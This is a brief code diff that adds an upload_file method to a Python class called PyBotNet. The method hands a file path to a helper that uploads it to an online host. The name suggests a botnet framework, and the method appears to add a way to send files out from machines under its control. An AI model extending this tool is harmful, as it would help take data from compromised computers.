@@ -130,3 +130,7 @@ class PyBotNet:
             file_name = (file_name[0])
 
         return scripts.download_manager(download_link, file_name)
+
+    def upload_file(self, file_route: str):
+        '''upload file to a online host , return link and other data'''
+        return scripts.upload_manager(file_route, self.logger)
